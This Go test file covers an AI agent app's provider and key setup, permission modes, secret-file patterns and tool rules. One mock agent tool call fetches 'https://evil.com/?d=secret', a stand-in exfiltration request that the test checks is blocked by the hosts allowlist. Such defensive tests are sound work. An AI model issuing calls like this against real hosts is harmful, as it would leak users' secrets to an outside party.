package app

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/shakfu/gila/permission"
	"github.com/shakfu/gila/state"
	"github.com/shakfu/gila/tool"
)

func TestSplitModel(t *testing.T) {
	cases := []struct {
		in, provider, model string
		ok                  bool
	}{
		{"openrouter:openai/gpt-5.5", "openrouter", "openai/gpt-5.5", true},
		{"ollama:qwen3:8b", "ollama", "qwen3:8b", true},
		{"qwen3:8b", "", "", false},
		{"claude-opus-5", "", "", false},
	}
	for _, c := range cases {
		p, m, ok := SplitModel(c.in)
		if p != c.provider || m != c.model || ok != c.ok {
			t.Errorf("SplitModel(%q) = %q %q %v", c.in, p, m, ok)
		}
	}
}

func TestAKeyNeedsANamedProvider(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	if _, err := New(Options{APIKey: "k"}); err == nil {
		t.Fatal("a key without a provider was accepted")
	}
}

func TestConflictingProviderIsRefused(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	if _, err := New(Options{Provider: "openai", Model: "anthropic:claude-opus-5"}); err == nil {
		t.Fatal("conflicting provider accepted")
	}
}

func TestModelFallsBackToTheRememberedThenTheDefault(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("OPENROUTER_API_KEY", "k")
	a, err := New(Options{Provider: "openrouter"})
	if err != nil {
		t.Fatal(err)
	}
	if a.Agent.Model != "anthropic/claude-opus-5" {
		t.Fatalf("default model %q", a.Agent.Model)
	}
	a.Agent.Model = "x/y"
	a.Remember()
	b, err := New(Options{})
	if err != nil {
		t.Fatal(err)
	}
	if b.ProviderID != "openrouter" || b.Agent.Model != "x/y" {
		t.Fatalf("remembered %s %s", b.ProviderID, b.Agent.Model)
	}
}

// A failed switch changes nothing.
func TestAFailedSwitchLeavesTheSessionAlone(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("OPENROUTER_API_KEY", "k")
	t.Setenv("LLAMACPP_BASE_URL", "http://127.0.0.1:1/v1")
	a, err := New(Options{Provider: "openrouter", Model: "x/y"})
	if err != nil {
		t.Fatal(err)
	}
	if err := a.Switch(context.Background(), "llamacpp", ""); err == nil {
		t.Fatal("switched to an unreachable server with no model")
	}
	if a.ProviderID != "openrouter" || a.Agent.Model != "x/y" || a.Agent.Provider.Name() != "openrouter" {
		t.Fatalf("state changed: %s %s", a.ProviderID, a.Agent.Model)
	}
}

// A GUI app launched from the desktop has no key variables; keys given directly must select
// and authenticate a provider, and state must go where the app says.
func TestKeysAndDirectoriesComeFromOptions(t *testing.T) {
	for _, v := range []string{"ANTHROPIC_API_KEY", "ANTHROPIC_AUTH_TOKEN", "OPENAI_API_KEY", "OPENROUTER_API_KEY"} {
		t.Setenv(v, "")
	}
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	dir := t.TempDir()
	a, err := New(Options{Keys: map[string]string{"openrouter": "k"}, StateDir: dir, CacheDir: dir, ConfigDir: dir})
	if err != nil {
		t.Fatal(err)
	}
	if a.ProviderID != "openrouter" || !a.HasKey("openrouter") || a.HasKey("openai") {
		t.Fatalf("provider %s", a.ProviderID)
	}
	if k, _ := a.credentials("openrouter"); k != "k" {
		t.Fatalf("key %q", k)
	}
	a.Remember()
	if a.State.Dir() != dir || state.Load(dir).Provider != "openrouter" || state.Load("").Provider != "" {
		t.Fatal("state was not kept in StateDir")
	}
	if _, err := New(Options{Keys: map[string]string{"nope": "k"}}); err == nil {
		t.Fatal("a key for an unknown provider was accepted")
	}
}

// A gateway's key goes only with the gateway's endpoint.
func TestAGatewayKeyStaysWithItsEndpoint(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	a, err := New(Options{Provider: "openai", Model: "m", BaseURL: "http://gw", APIKey: "GW", Keys: map[string]string{"anthropic": "A"}})
	if err != nil {
		t.Fatal(err)
	}
	if k, b := a.credentials("openai"); k != "GW" || b != "http://gw" {
		t.Fatalf("openai: %q %q", k, b)
	}
	if k, b := a.credentials("anthropic"); k != "A" || b != "" {
		t.Fatalf("anthropic: %q %q", k, b)
	}
}

func TestAutoIsTheDefaultMode(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("OPENROUTER_API_KEY", "k")
	a, err := New(Options{Provider: "openrouter"})
	if err != nil {
		t.Fatal(err)
	}
	if a.Mode() != "auto" || a.Agent.Approve == nil {
		t.Fatalf("mode %q", a.Mode())
	}
	if _, err := New(Options{Provider: "openrouter", Permissions: "yolo"}); err == nil {
		t.Fatal("accepted an unknown mode")
	}
}

// An explicit mode wins over settings.toml, which wins over auto.
func TestModePrecedence(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("OPENROUTER_API_KEY", "k")
	cfg := t.TempDir()
	if err := os.WriteFile(filepath.Join(cfg, state.SettingsFile), []byte("[permissions]\nmode = \"ask\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	for explicit, want := range map[string]string{"": "ask", "read-only": "read-only"} {
		a, err := New(Options{Provider: "openrouter", ConfigDir: cfg, Permissions: explicit})
		if err != nil {
			t.Fatal(err)
		}
		if string(a.Mode()) != want {
			t.Errorf("explicit %q: mode %q, want %q", explicit, a.Mode(), want)
		}
	}
	a, err := New(Options{Provider: "openrouter", ConfigDir: t.TempDir()})
	if err != nil || a.Mode() != "auto" {
		t.Fatalf("no settings: %v %v", a.Mode(), err)
	}
}

// The app's rules are their own layer: they add to settings.toml but cannot lift its patterns.
func TestAppRulesCannotLiftSettings(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("OPENROUTER_API_KEY", "k")
	cfg := t.TempDir()
	settings := "[permissions]\nsecrets = [\"*.pem\"]\n"
	if err := os.WriteFile(filepath.Join(cfg, state.SettingsFile), []byte(settings), 0o600); err != nil {
		t.Fatal(err)
	}
	a, err := New(Options{Provider: "openrouter", ConfigDir: cfg,
		Rules: permission.Rules{Secrets: []string{"!*.pem", "*.secret"}}})
	if err != nil {
		t.Fatal(err)
	}
	root := t.TempDir()
	if !a.Rules().IsSecret(root, "key.pem") || !a.Rules().IsSecret(root, "x.secret") {
		t.Fatalf("layers %+v", a.Rules())
	}
	if _, err := New(Options{Provider: "openrouter", ConfigDir: cfg, Rules: permission.Rules{Secrets: []string{"["}}}); err == nil {
		t.Fatal("accepted a bad app pattern")
	}
}

// Custom tools join the defaults, are reachable by the model, and follow the permission mode.
func TestCustomTools(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	dir := t.TempDir()
	ran := map[string]bool{}
	mk := func(name string, readOnly bool) tool.Tool {
		tl, err := tool.New(tool.Def{Name: name, ReadOnly: readOnly,
			Run: func(context.Context, json.RawMessage) (tool.Result, error) {
				ran[name] = true
				return tool.Result{Output: "done"}, nil
			}})
		if err != nil {
			t.Fatal(err)
		}
		return tl
	}
	script := `[{"calls":[{"name":"lookup","arguments":{}},{"name":"deploy","arguments":{}}]},{"text":"ok"}]`
	os.WriteFile(filepath.Join(dir, "m.json"), []byte(script), 0o600)
	a, err := New(Options{Mock: filepath.Join(dir, "m.json"), Root: dir, Permissions: "read-only",
		Tools: []tool.Tool{mk("lookup", true), mk("deploy", false)}})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := a.Agent.Run(context.Background(), "go", nil); err != nil {
		t.Fatal(err)
	}
	if !ran["lookup"] || ran["deploy"] {
		t.Fatalf("ran %v: read-only mode should run lookup and refuse deploy", ran)
	}
	if _, err := New(Options{Mock: filepath.Join(dir, "m.json"), Root: dir, Tools: []tool.Tool{mk("bash", true)}}); err == nil {
		t.Fatal("accepted a custom tool named bash")
	}
}

// A network tool reaches hosts in settings.toml's allowlist and is refused elsewhere in
// read-only mode.
func TestNetworkToolsFollowTheHostsAllowlist(t *testing.T) {
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	dir, cfg := t.TempDir(), t.TempDir()
	os.WriteFile(filepath.Join(cfg, state.SettingsFile), []byte("[permissions]\nmode = \"read-only\"\nhosts = [\"pkg.go.dev\"]\n"), 0o600)
	var fetched []string
	fetch, err := tool.New(tool.Def{
		Name: "fetch",
		Hosts: func(a json.RawMessage) ([]string, error) {
			var v struct{ URL string }
			if err := json.Unmarshal(a, &v); err != nil {
				return nil, err
			}
			h, err := tool.HostOf(v.URL)
			return []string{h}, err
		},
		Paths: func(json.RawMessage) ([]string, error) { return nil, nil },
		Run: func(_ context.Context, a json.RawMessage) (tool.Result, error) {
			fetched = append(fetched, string(a))
			return tool.Result{Output: "page"}, nil
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	script := `[{"calls":[{"name":"fetch","arguments":{"url":"https://pkg.go.dev/net"}},
	                      {"name":"fetch","arguments":{"url":"https://evil.com/?d=secret"}}]},{"text":"ok"}]`
	os.WriteFile(filepath.Join(dir, "m.json"), []byte(script), 0o600)
	a, err := New(Options{Mock: filepath.Join(dir, "m.json"), Root: dir, ConfigDir: cfg, Tools: []tool.Tool{fetch}})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := a.Agent.Run(context.Background(), "go", nil); err != nil {
		t.Fatal(err)
	}
	if len(fetched) != 1 || !strings.Contains(fetched[0], "pkg.go.dev") {
		t.Fatalf("fetched %v", fetched)
	}
	if r := a.Agent.History[2].Results[1]; !r.IsError || !strings.Contains(r.Content, "evil.com, which is not in the hosts allowlist") {
		t.Fatalf("result %+v", r)
	}
}
